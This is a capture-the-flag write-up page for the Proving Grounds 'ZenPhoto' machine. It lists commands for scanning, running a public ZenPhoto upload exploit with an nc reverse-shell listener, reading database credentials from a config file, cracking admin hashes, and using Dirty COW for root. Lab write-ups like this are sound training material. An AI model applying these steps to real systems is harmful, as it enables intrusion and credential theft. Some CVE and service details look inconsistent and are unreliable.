@@ -1,0 +1,1226 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="Gmrvh">
+      
+      
+        <link rel="canonical" href="https://gmrvh.github.io/ctf-writeups/pg/zenphoto/">
+      
+      
+        <link rel="prev" href="../zipper/">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
+    
+    
+      
+        <title>ZenPhoto - Gmvrh</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.2afb09e1.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="white">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#zenphoto-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Gmvrh" class="md-header__button md-logo" aria-label="Gmvrh" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Gmvrh
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              ZenPhoto
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/gmrvh/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Gmvrh" class="md-nav__button md-logo" aria-label="Gmvrh" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Gmvrh
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/gmrvh/ctf-writeups" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    CTF Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Overview
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/cypher/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cypher
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/eureka/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Eureka
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/monteverde/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Monteverde
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/sauna/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sauna
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/timelapse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Timelapse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/forest/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Forest
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/cascade/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cascade
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/blackfield/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blackfield
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/soccer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Soccer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../htb/jeeves/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Jeeves
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ProvingGrounds
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            ProvingGrounds
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dvr4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    DVR4
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../shenzi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shenzi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nora/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nora
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../catto/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Catto
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bottleup/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Bottleup
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../resourced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Resourced
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../confusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Confusion
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Clue
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../flu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Flu
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../zipper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Zipper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    ZenPhoto
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    ZenPhoto
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port Scanning
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#web-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-research" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vulnerability Research
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gaining-initial-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      Gaining Initial Access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Gaining Initial Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-zenphoto" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploiting ZenPhoto
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-exploitation-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Post-Exploitation Enumeration
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Database Enumeration
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Privilege Escalation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#kernel-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kernel Exploitation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="zenphoto-writeup">ZenPhoto - Writeup</h1>
+<h2 id="initial-enumeration">Initial Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>A comprehensive port scan revealed several open services:
+<div class="highlight"><pre><span></span><code>PORT      STATE SERVICE       VERSION
+22/tcp    open  ssh           OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp    open  ipp           CUPS 1.4
+| http-server-header: CUPS/1.4
+| http-methods:
+|_  Potentially risky methods: PUT
+|_http-title: 403 Forbidden
+80/tcp    open  http          Apache httpd 2.2.14 ((Ubuntu))
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+3306/tcp  open  mysql         MySQL (unauthorized)
+</code></pre></div></p>
+<p>From this scan, I identified that the target was running Ubuntu Linux with several services:
+- OpenSSH 5.3p1
+- CUPS 1.4 printing service (unusually on port 23)
+- Apache 2.2.14 web server
+- MySQL database server</p>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>I began investigating the web server on port 80 with directory enumeration:
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>http://192.168.X.X<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<span class="w"> </span>-x<span class="w"> </span>php,txt,html
+</code></pre></div></p>
+<p>This revealed a ZenPhoto installation at the root directory. ZenPhoto is an open-source gallery CMS application. Looking at the version information in the footer, I identified it as ZenPhoto 1.4.1.4.</p>
+<h3 id="vulnerability-research">Vulnerability Research</h3>
+<p>Research indicated that ZenPhoto 1.4.1.4 is vulnerable to several critical vulnerabilities:
+1. Multiple PHP file upload vulnerabilities
+2. Remote Code Execution via third-party library flaws
+3. SQL injection vulnerabilities</p>
+<p>The most critical vulnerability is a remote code execution in the image upload functionality (CVE-2012-5978).</p>
+<h2 id="gaining-initial-access">Gaining Initial Access</h2>
+<h3 id="exploiting-zenphoto">Exploiting ZenPhoto</h3>
+<p>I downloaded a public exploit for ZenPhoto 1.4.1.4:
+<div class="highlight"><pre><span></span><code>searchsploit<span class="w"> </span>-m<span class="w"> </span>php/webapps/18083.php
+</code></pre></div></p>
+<p>This exploit takes advantage of a file upload vulnerability in the TinyMCE editor component of ZenPhoto.</p>
+<p>I modified the exploit to point to my target and set up a listener:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div></p>
+<p>Then executed the exploit:
+<div class="highlight"><pre><span></span><code>php<span class="w"> </span><span class="m">18083</span>.php<span class="w"> </span>http://192.168.X.X/
+</code></pre></div></p>
+<p>This uploaded a PHP web shell to the server and provided me with a reverse shell connection as the www-data user.</p>
+<h3 id="post-exploitation-enumeration">Post-Exploitation Enumeration</h3>
+<p>After gaining an initial foothold, I stabilized the shell:
+<div class="highlight"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+</code></pre></div></p>
+<p>I began enumerating the system for potential privilege escalation vectors:
+<div class="highlight"><pre><span></span><code>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-u<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div></p>
+<h2 id="database-enumeration">Database Enumeration</h2>
+<p>I found database credentials in the ZenPhoto configuration file:
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>/var/www/zenphoto/zp-core/zp-config.php
+</code></pre></div></p>
+<p>This revealed the following credentials:
+- <strong>Database</strong>: zenphoto
+- <strong>Username</strong>: zenphoto
+- <strong>Password</strong>: zenph0t0</p>
+<p>I connected to the MySQL server to extract further information:
+<div class="highlight"><pre><span></span><code>mysql<span class="w"> </span>-u<span class="w"> </span>zenphoto<span class="w"> </span>-p<span class="s1">&#39;zenph0t0&#39;</span><span class="w"> </span>-D<span class="w"> </span>zenphoto
+</code></pre></div></p>
+<p>I extracted user credentials from the administrators table:
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">administrators</span><span class="p">;</span>
+</code></pre></div></p>
+<p>This revealed an admin user with a hashed password, which I cracked using hashcat:
+<div class="highlight"><pre><span></span><code>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">300</span><span class="w"> </span>--force<span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="kernel-exploitation">Kernel Exploitation</h3>
+<p>System enumeration revealed outdated kernel information:
+<div class="highlight"><pre><span></span><code>uname<span class="w"> </span>-a
+Linux<span class="w"> </span>ubuntu<span class="w"> </span><span class="m">2</span>.6.32-21-generic<span class="w"> </span><span class="c1">#32-Ubuntu SMP i686 GNU/Linux</span>
+</code></pre></div></p>
+<p>This kernel version (2.6.32) is vulnerable to multiple local privilege escalation vulnerabilities, including Dirty COW (CVE-2016-5195).</p>
+<p>I downloaded and compiled the Dirty COW exploit:
+<div class="highlight"><pre><span></span><code>gcc<span class="w"> </span>-pthread<span class="w"> </span>dirty.c<span class="w"> </span>-o<span class="w"> </span>dirty<span class="w"> </span>-lcrypt
+</code></pre></div></p>
+<p>Executed the exploit with a custom password:
+<div class="highlight"><pre><span></span><code>./dirty<span class="w"> </span>password123
+</code></pre></div></p>
+<p>The exploit created a new root user in /etc/passwd with the specified password.</p>
+<p>I switched to the newly created root user:
+<div class="highlight"><pre><span></span><code>su<span class="w"> </span>firefart
+</code></pre></div></p>
+<p>This provided a root shell, successfully completing the challenge.</p>
+<div class="highlight"><pre><span></span><code><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "toc.integrate", "search.suggest", "content.code.copy"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
